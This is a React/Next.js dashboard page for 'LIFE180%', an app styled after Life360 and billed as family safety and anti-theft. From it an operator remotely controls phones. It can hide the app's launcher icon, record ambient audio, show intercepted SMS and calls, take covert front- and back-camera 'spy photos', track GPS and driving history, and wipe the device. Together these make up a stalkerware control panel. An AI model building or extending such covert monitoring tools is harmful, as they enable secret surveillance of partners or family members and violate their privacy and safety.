"use client";
import { useEffect, useState, useCallback, useMemo } from "react";
import { useRouter } from "next/navigation";
import dynamic from "next/dynamic";
import { getFirebaseAuth } from "@/lib/firebase";

// Dynamically import Leaflet Map (SSR false for browser window)
const LeafletMap = dynamic(() => import("../components/LeafletMap"), {
  ssr: false,
  loading: () => (
    <div style={{ position: "absolute", inset: 0, display: "flex", alignItems: "center", justifyContent: "center", background: "#f8fafc", color: "#64748b" }}>
      <div style={{ textAlign: "center" }}>
        <div style={{ fontSize: 32, animation: "spin 1s infinite linear" }}>🌍</div>
        <div style={{ marginTop: 8, fontWeight: 600 }}>Loading interactive Life360 map…</div>
      </div>
    </div>
  ),
});

const QUICK_COMMANDS = [
  { type: "LOCK", ico: "🔒", label: "Lock", color: "#ef4444", hint: "Lock + owner PIN gate" },
  { type: "UNLOCK", ico: "🔓", label: "Unlock", color: "#10b981", hint: "Clear PIN gate" },
  { type: "RECORD_AUDIO", ico: "🎙️", label: "Mic 30s", color: "#7c3aed", hint: "Record ambient audio" },
  { type: "START_LIVE_TRACK", ico: "🗺️", label: "Track 30s", color: "#2563eb", hint: "High-frequency GPS" },
  { type: "STEALTH_ON", ico: "🥷", label: "Hide App", color: "#334155", hint: "Hide launcher icon" },
  { type: "STEALTH_OFF", ico: "👁️", label: "Unhide", color: "#64748b", hint: "Restore icon" },
  { type: "RING", ico: "🔔", label: "Siren", color: "#f59e0b", hint: "5-min loud alarm + strobe" },
  { type: "FRONT_PHOTO", ico: "🤳", label: "Selfie", color: "#0284c7", hint: "Intruder camera" },
  { type: "BACK_PHOTO", ico: "📸", label: "Surround", color: "#0891b2", hint: "Back camera" },
  { type: "MOTION_ARM", ico: "🔊", label: "Motion", color: "#ea580c", hint: "Rings if moved" },
  { type: "LOCATE", ico: "📍", label: "Locate", color: "#059669", hint: "Ping coordinates" },
  { type: "CHECK_STATUS", ico: "🩺", label: "Checkup", color: "#4f46e5", hint: "Test 14 guards" },
  { type: "SHUTDOWN", ico: "⏻", label: "Shutdown", color: "#475569", hint: "Deep lock / off" },
  { type: "WIPE", ico: "🧨", label: "Wipe", color: "#dc2626", danger: true, hint: "Factory reset" },
];

export default function Dashboard() {
  const router = useRouter();
  const [email, setEmail] = useState("");
  const [devices, setDevices] = useState([]);
  const [selectedId, setSelectedId] = useState("");
  const [locations, setLocations] = useState({});
  const [locHistory, setLocHistory] = useState([]);
  const [drivingSummary, setDrivingSummary] = useState(null);
  const [recordings, setRecordings] = useState([]);
  const [forwarded, setForwarded] = useState([]);
  const [alerts, setAlerts] = useState([]);
  const [photos, setPhotos] = useState([]);
  const [newPin, setNewPin] = useState("");
  const [lockMsg, setLockMsg] = useState("This phone is guarded by LIFE180%. Please return to owner.");
  const [toast, setToast] = useState("");
  const [lightbox, setLightbox] = useState(null);

  // Life360 View State
  const [activeTab, setActiveTab] = useState("map"); // map | driving | safety | places | settings
  const [sheetExpanded, setSheetExpanded] = useState(false);

  useEffect(() => {
    const saved = localStorage.getItem("ldg_email");
    if (!saved) {
      router.push("/");
      return;
    }
    setEmail(saved);
  }, [router]);

  const refreshData = useCallback(async () => {
    if (!email) return;
    try {
      const [dRes, aRes, pRes, locRes, audRes, fwdRes] = await Promise.all([
        fetch(`/api/devices?owner=${encodeURIComponent(email)}`),
        fetch(`/api/alert?owner=${encodeURIComponent(email)}`),
        fetch(`/api/photos?owner=${encodeURIComponent(email)}${selectedId ? `&deviceId=${encodeURIComponent(selectedId)}` : ""}`),
        fetch(`/api/location?owner=${encodeURIComponent(email)}${selectedId ? `&deviceId=${encodeURIComponent(selectedId)}` : ""}`),
        fetch(`/api/audio?owner=${encodeURIComponent(email)}${selectedId ? `&deviceId=${encodeURIComponent(selectedId)}` : ""}`),
        fetch(`/api/forwarded?owner=${encodeURIComponent(email)}${selectedId ? `&deviceId=${encodeURIComponent(selectedId)}` : ""}`),
      ]);
      const [dJson, aJson, pJson, locJson, audJson, fwdJson] = await Promise.all([
        dRes.json(), aRes.json(), pRes.json(), locRes.json(), audRes.json(), fwdRes.json()
      ]);

      const devList = dJson.devices || [];
      setDevices(devList);
      if (!selectedId && devList.length > 0) {
        setSelectedId(devList[0].deviceId);
      }
      setAlerts(aJson.alerts || []);
      setPhotos(pJson.photos || []);
      setLocations(locJson.latest || {});
      setLocHistory(locJson.history || []);
      setDrivingSummary(locJson.drivingSummary || null);
      setRecordings(audJson.recordings || []);
      setForwarded(fwdJson.forwarded || []);
    } catch (e) {
      console.error("Dashboard refresh failed", e);
    }
  }, [email, selectedId]);

  useEffect(() => {
    refreshData();
    const interval = setInterval(refreshData, 4000);
    return () => clearInterval(interval);
  }, [refreshData]);

  const sendCommand = async (type) => {
    if (!selectedId) {
      setToast("Select a device first");
      return;
    }
    if (type === "WIPE" && !confirm("⚠️ DANGER: Factory reset? This permanently erases all phone data!")) {
      return;
    }
    setToast(`Queuing ${type}…`);
    try {
      const res = await fetch("/api/command", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          owner: email,
          deviceId: selectedId,
          type,
          message: lockMsg,
          newPin: type === "LOCK" ? newPin : undefined,
        }),
      });
      const data = await res.json();
      if (data.ok) {
        setToast(`✅ ${type} queued — phone will execute on next poll`);
        refreshData();
      } else {
        setToast(`❌ Failed: ${data.error || "unknown"}`);
      }
    } catch {
      setToast("Network error");
    }
    setTimeout(() => setToast(""), 4000);
  };

  const handleLogout = async () => {
    try {
      const auth = await getFirebaseAuth();
      if (auth) {
        const { signOut } = await import("firebase/auth");
        await signOut(auth);
      }
    } catch (e) {}
    localStorage.removeItem("ldg_email");
    localStorage.removeItem("ldg_auth");
    router.push("/");
  };

  // Build Circle Member models for Leaflet map & Bottom Sheet
  const circleMembers = useMemo(() => {
    return devices.map((d) => {
      const loc = locations[d.deviceId];
      const isOnline = d.lastSeen && (Date.now() - new Date(d.lastSeen).getTime()) < 120_000;
      const isDriving = (loc?.speedKmh || 0) > 15;

      let statusText = "Offline";
      if (isDriving) {
        statusText = `🚗 Driving • ${Math.round(loc.speedKmh)} km/h`;
      } else if (isOnline) {
        statusText = "📍 Stopped / At Home";
      }

      return {
        id: d.deviceId,
        name: d.model || d.deviceId,
        avatar: "/logo-thumb.png",
        battery: loc?.battery ?? 85,
        lat: loc?.lat ?? null,
        lng: loc?.lng ?? null,
        speedKmh: loc?.speedKmh ?? 0,
        statusText,
        isDriving,
        isOnline,
        lastSeen: loc?.ts || d.lastSeen || new Date().toISOString(),
      };
    });
  }, [devices, locations]);

  const selectedMember = circleMembers.find((m) => m.id === selectedId) || circleMembers[0] || null;

  return (
    <div className="life-shell">
      {/* 1. Glass Top Navigation Bar */}
      <header className="glass-nav">
        <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
          <img src="/logo-thumb.png" alt="LIFE180%" style={{ width: 34, height: 34, borderRadius: 10, objectFit: "cover" }} />
          <div>
            <div style={{ fontWeight: 800, fontSize: 16, color: "#1e1b4b", display: "flex", alignItems: "center", gap: 6 }}>
              <span>LIFE180%</span>
              <span style={{ fontSize: 11, background: "#7c3aed18", color: "#6d28d9", padding: "1px 6px", borderRadius: 6, fontWeight: 700 }}>
                Circle
              </span>
            </div>
            <div style={{ fontSize: 11, color: "#64748b" }}>Family Safety & Real-Time Defense</div>
          </div>
        </div>

        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          {/* Download APK Button */}
          <a
            href="/LIFE180.apk"
            download="LIFE180.apk"
            className="btn btn-primary"
            style={{
              padding: "7px 14px",
              fontSize: 12,
              textDecoration: "none",
              display: "flex",
              alignItems: "center",
              gap: 6,
              background: "#6d28d9",
              borderRadius: 99,
              color: "#fff",
              fontWeight: 700,
            }}
          >
            <span>📲</span>
            <span>Get App</span>
          </a>

          {/* User Profile / Logout */}
          <div className="circle-pill" onClick={handleLogout} title="Click to Sign Out">
            <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#22c55e" }} />
            <span style={{ maxWidth: 120, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{email}</span>
            <span style={{ fontSize: 10, color: "#94a3b8" }}>▼</span>
          </div>
        </div>
      </header>

      {/* Floating Toast Notification */}
      {toast && (
        <div style={{ position: "absolute", top: 80, left: "50%", transform: "translateX(-50%)", zIndex: 1000, background: "rgba(15, 23, 42, 0.92)", backdropFilter: "blur(8px)", color: "#f8fafc", padding: "10px 20px", borderRadius: 30, fontSize: 13, fontWeight: 600, boxShadow: "0 10px 25px rgba(0,0,0,0.2)" }}>
          {toast}
        </div>
      )}

      {/* 2. Interactive Map (Leaflet) */}
      <LeafletMap
        members={circleMembers}
        selectedMemberId={selectedId}
        onSelectMember={(id) => {
          setSelectedId(id);
          setSheetExpanded(true);
        }}
        center={selectedMember && selectedMember.lat ? { lat: selectedMember.lat, lng: selectedMember.lng } : null}
      />

      {/* Floating Recenter & SOS Overlay Buttons */}
      <div style={{ position: "absolute", right: 18, bottom: sheetExpanded ? 460 : 250, zIndex: 150, display: "flex", flexDirection: "column", gap: 12, transition: "bottom 0.35s ease" }}>
        <button
          onClick={() => {
            if (selectedMember && selectedMember.lat) {
              setToast(`Centered on ${selectedMember.name}`);
            } else {
              setToast("Waiting for phone GPS fix…");
            }
          }}
          style={{ width: 48, height: 48, borderRadius: "50%", background: "#ffffff", border: "1px solid #e2e8f0", boxShadow: "0 6px 16px rgba(0,0,0,0.15)", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", fontSize: 20 }}
          title="Recenter on Selected Device"
        >
          🎯
        </button>
        <button
          onClick={() => sendCommand("RING")}
          style={{ width: 52, height: 52, borderRadius: "50%", background: "linear-gradient(135deg, #ef4444, #b91c1c)", border: "none", boxShadow: "0 6px 20px rgba(239,68,68,0.4)", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", fontSize: 22, color: "#fff" }}
          title="Trigger Emergency Siren"
        >
          🚨
        </button>
      </div>

      {/* 3. Life360 Sliding Bottom Sheet */}
      <div
        className="life-sheet"
        style={{
          height: activeTab === "map" ? (sheetExpanded ? 420 : 220) : "calc(100vh - 84px)",
          bottom: 64, // sits right above bottom navigation bar
        }}
      >
        <div className="sheet-handle" onClick={() => setSheetExpanded(!sheetExpanded)} />

        {/* Tab 1: Map / Circle Member List + Quick Remote Commands */}
        {activeTab === "map" && (
          <div style={{ display: "flex", flexDirection: "column", height: "100%", overflow: "hidden" }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "8px 20px 4px" }}>
              <div style={{ fontWeight: 800, fontSize: 16, color: "#0f172a" }}>
                My Circle <span style={{ color: "#6d28d9", fontSize: 14 }}>({circleMembers.length})</span>
              </div>
              <button
                onClick={() => setSheetExpanded(!sheetExpanded)}
                style={{ background: "none", border: "none", color: "#6d28d9", fontWeight: 700, fontSize: 13, cursor: "pointer" }}
              >
                {sheetExpanded ? "Collapse ▾" : "Full Controls ▴"}
              </button>
            </div>

            {/* Member Card Carousel / List */}
            <div style={{ display: "flex", gap: 10, padding: "8px 16px", overflowX: "auto" }}>
              {circleMembers.length === 0 && (
                <div style={{ padding: "16px", color: "#64748b", fontSize: 13 }}>
                  No phones connected. Tap <b>Get App</b>, install on your phone and tap <b>🛡️ ON</b>.
                </div>
              )}
              {circleMembers.map((m) => {
                const isSelected = selectedId === m.id;
                return (
                  <div
                    key={m.id}
                    onClick={() => setSelectedId(m.id)}
                    style={{
                      flex: "0 0 240px",
                      background: isSelected ? "#f5f3ff" : "#f8fafc",
                      border: isSelected ? "2px solid #7c3aed" : "1px solid #e2e8f0",
                      borderRadius: 18,
                      padding: "12px",
                      cursor: "pointer",
                      display: "flex",
                      alignItems: "center",
                      gap: 12,
                      transition: "all 0.15s ease",
                    }}
                  >
                    <div style={{ position: "relative" }}>
                      <img src={m.avatar} alt={m.name} style={{ width: 44, height: 44, borderRadius: "50%", objectFit: "cover" }} />
                      <span
                        style={{
                          position: "absolute",
                          bottom: 0,
                          right: 0,
                          width: 12,
                          height: 12,
                          borderRadius: "50%",
                          background: m.isOnline ? "#22c55e" : "#cbd5e1",
                          border: "2px solid #fff",
                        }}
                      />
                    </div>
                    <div style={{ overflow: "hidden", flex: 1 }}>
                      <div style={{ fontWeight: 700, fontSize: 14, color: "#1e293b", textOverflow: "ellipsis", overflow: "hidden", whiteSpace: "nowrap" }}>
                        {m.name}
                      </div>
                      <div style={{ fontSize: 12, color: m.isDriving ? "#f59e0b" : "#64748b", fontWeight: m.isDriving ? 700 : 500, marginTop: 2 }}>
                        {m.statusText}
                      </div>
                      <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 11, color: "#94a3b8", marginTop: 4 }}>
                        <span>🔋 {m.battery}%</span>
                        <span>•</span>
                        <span>{new Date(m.lastSeen).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}</span>
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>

            {/* Expanded Command Center Pad */}
            {sheetExpanded && (
              <div style={{ flex: 1, overflowY: "auto", padding: "10px 16px 20px" }}>
                <div style={{ fontSize: 12, fontWeight: 700, color: "#64748b", textTransform: "uppercase", letterSpacing: 1, marginBottom: 8 }}>
                  Remote Defense Actions for {selectedMember?.name || "Selected Device"}
                </div>
                <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(95px, 1fr))", gap: 8 }}>
                  {QUICK_COMMANDS.map((c) => (
                    <button
                      key={c.type}
                      onClick={() => sendCommand(c.type)}
                      style={{
                        display: "flex",
                        flexDirection: "column",
                        alignItems: "center",
                        justifyContent: "center",
                        padding: "10px 6px",
                        background: "#f8fafc",
                        border: "1px solid #e2e8f0",
                        borderRadius: 14,
                        cursor: "pointer",
                        transition: "all 0.15s ease",
                      }}
                      title={c.hint}
                    >
                      <span style={{ fontSize: 20 }}>{c.ico}</span>
                      <span style={{ fontWeight: 700, fontSize: 12, color: c.color, marginTop: 4 }}>{c.label}</span>
                    </button>
                  ))}
                </div>

                {/* PIN and Message Input Row */}
                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, marginTop: 12 }}>
                  <div>
                    <label style={{ fontSize: 11, fontWeight: 600, color: "#64748b" }}>New Gate PIN on LOCK:</label>
                    <input
                      type="text"
                      placeholder="e.g. 5678"
                      value={newPin}
                      onChange={(e) => setNewPin(e.target.value.replace(/[^0-9A-Za-z]/g, "").slice(0, 16))}
                      style={{ width: "100%", padding: "6px 10px", borderRadius: 8, border: "1px solid #cbd5e1", fontSize: 12, marginTop: 3 }}
                    />
                  </div>
                  <div>
                    <label style={{ fontSize: 11, fontWeight: 600, color: "#64748b" }}>Lost Screen Message:</label>
                    <input
                      type="text"
                      value={lockMsg}
                      onChange={(e) => setLockMsg(e.target.value)}
                      style={{ width: "100%", padding: "6px 10px", borderRadius: 8, border: "1px solid #cbd5e1", fontSize: 12, marginTop: 3 }}
                    />
                  </div>
                </div>
              </div>
            )}
          </div>
        )}

        {/* Tab 2: Driving Safety & Speed Reports (Life360 Signature Feature) */}
        {activeTab === "driving" && (
          <div style={{ flex: 1, overflowY: "auto", padding: "16px 20px" }}>
            <h2 style={{ fontSize: 20, fontWeight: 800, color: "#1e1b4b" }}>🚗 Driving Safety & 30-Day Velocity History</h2>
            <p style={{ fontSize: 13, color: "#64748b", marginTop: 2 }}>
              Automatic telemetry records drive trips, peak speed, sudden stops, and route history.
            </p>

            {/* Summary KPI Cards */}
            <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(130px, 1fr))", gap: 12, marginTop: 16 }}>
              <div style={{ background: "#f8fafc", padding: "14px", borderRadius: 16, border: "1px solid #e2e8f0" }}>
                <div style={{ fontSize: 11, fontWeight: 700, color: "#64748b" }}>CURRENT SPEED</div>
                <div style={{ fontSize: 24, fontWeight: 800, color: (locations[selectedId]?.speedKmh || 0) > 15 ? "#f59e0b" : "#2563eb", marginTop: 4 }}>
                  {locations[selectedId]?.speedKmh ? `${Math.round(locations[selectedId].speedKmh)} km/h` : "0 km/h"}
                </div>
                <div style={{ fontSize: 11, color: (locations[selectedId]?.speedKmh || 0) > 15 ? "#f59e0b" : "#10b981", fontWeight: 600 }}>
                  {(locations[selectedId]?.speedKmh || 0) > 15 ? "🚗 In Motion" : "🛑 Stationary"}
                </div>
              </div>

              <div style={{ background: "#f8fafc", padding: "14px", borderRadius: 16, border: "1px solid #e2e8f0" }}>
                <div style={{ fontSize: 11, fontWeight: 700, color: "#64748b" }}>MAX RECORDED SPEED</div>
                <div style={{ fontSize: 24, fontWeight: 800, color: "#1e293b", marginTop: 4 }}>
                  {drivingSummary ? `${drivingSummary.maxSpeedKmh} km/h` : "–"}
                </div>
                <div style={{ fontSize: 11, color: "#64748b" }}>30-Day Peak Speed</div>
              </div>

              <div style={{ background: "#f8fafc", padding: "14px", borderRadius: 16, border: "1px solid #e2e8f0" }}>
                <div style={{ fontSize: 11, fontWeight: 700, color: "#64748b" }}>RECORDED TRIPS</div>
                <div style={{ fontSize: 24, fontWeight: 800, color: "#7c3aed", marginTop: 4 }}>
                  {drivingSummary ? drivingSummary.drivingPointsCount : 0}
                </div>
                <div style={{ fontSize: 11, color: "#64748b" }}>Waypoints &gt; 15 km/h</div>
              </div>

              <div style={{ background: "#f8fafc", padding: "14px", borderRadius: 16, border: "1px solid #e2e8f0" }}>
                <div style={{ fontSize: 11, fontWeight: 700, color: "#64748b" }}>DATA RETENTION</div>
                <div style={{ fontSize: 24, fontWeight: 800, color: "#10b981", marginTop: 4 }}>30 Days</div>
                <div style={{ fontSize: 11, color: "#10b981" }}>Rolling Day 31 Purge</div>
              </div>
            </div>

            {/* Location History Table */}
            <div style={{ marginTop: 20 }}>
              <div style={{ fontWeight: 700, fontSize: 15, marginBottom: 10, color: "#1e293b" }}>Recent Drive Points</div>
              <div style={{ border: "1px solid #e2e8f0", borderRadius: 14, overflow: "hidden" }}>
                <table style={{ width: "100%", fontSize: 12, borderCollapse: "collapse", background: "#fff" }}>
                  <thead style={{ background: "#f8fafc", borderBottom: "1px solid #e2e8f0", color: "#64748b" }}>
                    <tr>
                      <th style={{ padding: "8px 12px", textAlign: "left" }}>Time</th>
                      <th style={{ padding: "8px 12px", textAlign: "left" }}>Coordinates</th>
                      <th style={{ padding: "8px 12px", textAlign: "left" }}>Speed</th>
                      <th style={{ padding: "8px 12px", textAlign: "left" }}>State</th>
                      <th style={{ padding: "8px 12px", textAlign: "left" }}>Battery</th>
                      <th style={{ padding: "8px 12px", textAlign: "left" }}>Google Maps</th>
                    </tr>
                  </thead>
                  <tbody>
                    {locHistory.slice(0, 20).map((l) => (
                      <tr key={l.id || l.ts} style={{ borderBottom: "1px solid #f1f5f9" }}>
                        <td style={{ padding: "8px 12px" }}>{new Date(l.ts).toLocaleTimeString()}</td>
                        <td style={{ padding: "8px 12px", fontFamily: "monospace" }}>{l.lat?.toFixed(4)}, {l.lng?.toFixed(4)}</td>
                        <td style={{ padding: "8px 12px", fontWeight: l.speedKmh > 15 ? 700 : 500, color: l.speedKmh > 15 ? "#f59e0b" : "#475569" }}>
                          {l.speedKmh || 0} km/h
                        </td>
                        <td style={{ padding: "8px 12px" }}>{l.isDriving ? "🚗 Driving" : "🛑 Stopped"}</td>
                        <td style={{ padding: "8px 12px" }}>🔋 {l.battery ?? "?"}%</td>
                        <td style={{ padding: "8px 12px" }}>
                          <a href={`https://maps.google.com/?q=${l.lat},${l.lng}`} target="_blank" rel="noreferrer" style={{ color: "#2563eb", fontWeight: 600 }}>
                            View ↗
                          </a>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
                {locHistory.length === 0 && <div style={{ padding: 16, color: "#64748b", fontSize: 12 }}>No GPS drive points recorded yet.</div>}
              </div>
            </div>
          </div>
        )}

        {/* Tab 3: Security & SOS Dispatch (Audio, Intercepted Calls, Spy Photos) */}
        {activeTab === "safety" && (
          <div style={{ flex: 1, overflowY: "auto", padding: "16px 20px" }}>
            <h2 style={{ fontSize: 20, fontWeight: 800, color: "#1e1b4b" }}>🛡️ Safety Dispatch & Emergency Surveillance</h2>
            <p style={{ fontSize: 13, color: "#64748b", marginTop: 2 }}>
              Listen in to ambient microphone recordings, review intercepted SMS/calls, and inspect intruder selfies.
            </p>

            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginTop: 16 }}>
              {/* Audio Surveillance */}
              <div style={{ background: "#f8fafc", padding: 16, borderRadius: 16, border: "1px solid #e2e8f0" }}>
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                  <div style={{ fontWeight: 700, fontSize: 15, color: "#1e293b" }}>🎙️ Ambient Audio ({recordings.length})</div>
                  <button className="btn btn-primary" style={{ padding: "4px 10px", fontSize: 11, background: "#6d28d9" }} onClick={() => sendCommand("RECORD_AUDIO")}>
                    + Record 30s
                  </button>
                </div>
                <div style={{ marginTop: 12, display: "flex", flexDirection: "column", gap: 8, maxHeight: 250, overflowY: "auto" }}>
                  {recordings.length === 0 && <div style={{ color: "#94a3b8", fontSize: 12 }}>No audio clips yet. Tap + Record 30s.</div>}
                  {recordings.map((r) => (
                    <div key={r.id} style={{ background: "#fff", padding: 10, borderRadius: 10, border: "1px solid #e2e8f0" }}>
                      <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11, color: "#64748b", marginBottom: 4 }}>
                        <span><b>🎙️ {r.durationSeconds || 30}s Clip</b> ({Math.round((r.size || 0) / 1024)} KB)</span>
                        <span>{new Date(r.ts).toLocaleTimeString()}</span>
                      </div>
                      <audio controls src={`/api/audio?id=${r.id}`} style={{ width: "100%", height: 32 }} />
                    </div>
                  ))}
                </div>
              </div>

              {/* Intercepted Calls & Texts */}
              <div style={{ background: "#f8fafc", padding: 16, borderRadius: 16, border: "1px solid #e2e8f0" }}>
                <div style={{ fontWeight: 700, fontSize: 15, color: "#1e293b" }}>📲 Intercepted Phone Calls & Texts ({forwarded.length})</div>
                <div style={{ marginTop: 12, display: "flex", flexDirection: "column", gap: 8, maxHeight: 250, overflowY: "auto" }}>
                  {forwarded.length === 0 && <div style={{ color: "#94a3b8", fontSize: 12 }}>Incoming SMS and phone calls will show here in real time.</div>}
                  {forwarded.map((f) => (
                    <div key={f.id} style={{ background: "#fff", padding: 10, borderRadius: 10, border: "1px solid #e2e8f0", fontSize: 12 }}>
                      <div style={{ display: "flex", justifyContent: "space-between" }}>
                        <span><b>{f.type === "SMS" ? "📩 SMS from:" : "📞 Call:"}</b> <span style={{ color: "#6d28d9" }}>{f.from}</span></span>
                        <span style={{ fontSize: 10, color: "#94a3b8" }}>{new Date(f.ts).toLocaleTimeString()}</span>
                      </div>
                      {f.body && <div style={{ marginTop: 4, background: "#f1f5f9", padding: 6, borderRadius: 6, color: "#334155" }}>{f.body}</div>}
                    </div>
                  ))}
                </div>
              </div>
            </div>

            {/* Spy Photos */}
            <div style={{ marginTop: 20 }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 10 }}>
                <div style={{ fontWeight: 700, fontSize: 15, color: "#1e293b" }}>📷 Spy Photos & Intruder Selfies ({photos.length})</div>
                <div style={{ display: "flex", gap: 8 }}>
                  <button className="btn btn-outline" style={{ padding: "4px 10px", fontSize: 11 }} onClick={() => sendCommand("FRONT_PHOTO")}>
                    🤳 Front Photo
                  </button>
                  <button className="btn btn-outline" style={{ padding: "4px 10px", fontSize: 11 }} onClick={() => sendCommand("BACK_PHOTO")}>
                    📸 Back Photo
                  </button>
                </div>
              </div>
              <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(130px, 1fr))", gap: 10 }}>
                {photos.length === 0 && <div style={{ color: "#94a3b8", fontSize: 12 }}>No photos captured yet.</div>}
                {photos.map((p) => (
                  <div key={p.id} onClick={() => setLightbox(`/api/photos?id=${p.id}`)} style={{ background: "#fff", borderRadius: 12, overflow: "hidden", cursor: "pointer", border: "1px solid #e2e8f0" }}>
                    <img src={`/api/photos?id=${p.id}`} alt="spy" style={{ width: "100%", height: 110, objectFit: "cover" }} />
                    <div style={{ padding: 6, fontSize: 10, color: "#64748b" }}>
                      <div><b>{p.camera === "front" ? "🤳 Front" : "📸 Back"}</b></div>
                      <div>{new Date(p.ts).toLocaleTimeString()}</div>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* Tab 4: Settings & Health Check */}
        {activeTab === "settings" && (
          <div style={{ flex: 1, overflowY: "auto", padding: "16px 20px" }}>
            <h2 style={{ fontSize: 20, fontWeight: 800, color: "#1e1b4b" }}>⚙️ Circle Settings & Health Status</h2>
            <div style={{ display: "flex", flexDirection: "column", gap: 12, marginTop: 14 }}>
              <div style={{ background: "#f8fafc", padding: 14, borderRadius: 14, border: "1px solid #e2e8f0" }}>
                <div style={{ fontWeight: 700, fontSize: 14 }}>Account</div>
                <div style={{ fontSize: 12, color: "#64748b", marginTop: 2 }}>{email}</div>
              </div>
              <div style={{ background: "#f8fafc", padding: 14, borderRadius: 14, border: "1px solid #e2e8f0" }}>
                <div style={{ fontWeight: 700, fontSize: 14 }}>App Version</div>
                <div style={{ fontSize: 12, color: "#64748b", marginTop: 2 }}>LIFE180% v1.3.0 Pro • 30-Day Auto Purge Enabled</div>
              </div>
              <div style={{ background: "#f8fafc", padding: 14, borderRadius: 14, border: "1px solid #e2e8f0" }}>
                <div style={{ fontWeight: 700, fontSize: 14 }}>Offline SMS Fallback Number</div>
                <div style={{ fontSize: 12, color: "#64748b", marginTop: 2 }}>Send SMS <span className="code">LOCK MY DEVICE 1234</span> when data is offline.</div>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* 4. Life360 Persistent Bottom Navigation Bar */}
      <nav className="life-bottom-nav">
        <button className={`nav-tab ${activeTab === "map" ? "active" : ""}`} onClick={() => setActiveTab("map")}>
          <span className="tab-icon" style={{ fontSize: 20 }}>🗺️</span>
          <span>Location</span>
        </button>
        <button className={`nav-tab ${activeTab === "driving" ? "active" : ""}`} onClick={() => setActiveTab("driving")}>
          <span className="tab-icon" style={{ fontSize: 20 }}>🚗</span>
          <span>Driving</span>
        </button>
        <button className={`nav-tab ${activeTab === "safety" ? "active" : ""}`} onClick={() => setActiveTab("safety")}>
          <span className="tab-icon" style={{ fontSize: 20 }}>🛡️</span>
          <span>Safety</span>
        </button>
        <button className={`nav-tab ${activeTab === "settings" ? "active" : ""}`} onClick={() => setActiveTab("settings")}>
          <span className="tab-icon" style={{ fontSize: 20 }}>⚙️</span>
          <span>Settings</span>
        </button>
      </nav>

      {/* Lightbox for Photos */}
      {lightbox && (
        <div onClick={() => setLightbox(null)} style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.85)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 9999, padding: 20 }}>
          <img src={lightbox} alt="full" style={{ maxWidth: "90%", maxHeight: "90%", borderRadius: 16 }} />
        </div>
      )}
    </div>
  );
}
